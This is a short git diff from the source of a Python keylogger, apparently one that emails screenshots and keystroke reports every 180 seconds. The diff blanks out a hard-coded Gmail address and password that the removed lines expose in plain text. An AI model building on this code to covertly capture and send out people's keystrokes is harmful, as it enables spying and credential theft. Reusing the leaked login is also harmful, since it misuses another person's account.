@@ -33,9 +33,9 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 send_report_every=180
-email_address = "mailtemptesting@gmail.com" # Enter disposable email here
-email_password = "Vr@jM@ilT3sting" # Enter email password here
-toaddr = "mailtemptesting@gmail.com"
+email_address = "" # Enter disposable email here
+email_password = "" # Enter email password here
+toaddr = ""
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
